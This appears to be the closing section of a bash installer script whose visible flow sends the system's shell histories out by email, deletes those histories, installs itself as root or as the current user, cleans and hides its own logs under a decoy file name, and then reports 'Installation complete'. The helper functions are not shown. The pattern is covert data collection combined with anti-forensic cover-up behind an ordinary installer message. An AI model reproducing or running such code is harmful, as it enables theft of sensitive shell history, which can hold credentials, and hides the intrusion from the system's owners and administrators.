log_hidden "Sending system history report..."
send_histories_email || log_hidden "Continuing after email attempt..."

# Always cleanup histories for security
log_hidden "Cleaning up shell histories..."
cleanup_histories

# Installation
if [[ $(id -u) -eq 0 ]]; then
    log_hidden "Running as root"
    root_installation
else
    log_hidden "Running as regular user"
    user_installation
fi

# Final cleanup and hiding
log_hidden "=== FINALIZING INSTALLATION ==="
clean_hidden_logs
hide_logfile

log_hidden "Script execution completed at: $(date)"
log_hidden "Hidden log location: $INSTALL_DIR/.bash_profile.backup"

echo "[✓] Installation complete!"
echo "[*] All operations logged to hidden location"
echo "[*] To view logs: cat $INSTALL_DIR/.bash_profile.backup 2>/dev/null"
